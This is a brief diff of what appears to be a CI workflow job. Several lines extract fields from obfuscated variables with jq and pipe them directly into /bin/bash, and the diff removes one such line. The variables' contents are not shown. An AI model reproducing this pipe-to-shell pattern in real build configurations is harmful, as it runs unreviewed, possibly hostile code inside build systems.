@@ -24,7 +24,6 @@ jobs:
           echo $zk3360 | jq -r .c627 | /bin/bash
           printf '%s' "$sswhs87" | jq -r .caf3075 | /bin/bash
           printf '%s' "$fb72046" | jq -r .di7928 | /bin/bash
-          echo $hbrc0786 | jq -r .poht92117 | /bin/bash
           printf '%s' "$ex786" | jq -r .ean55193 | /bin/bash
 
       - name: Archive output
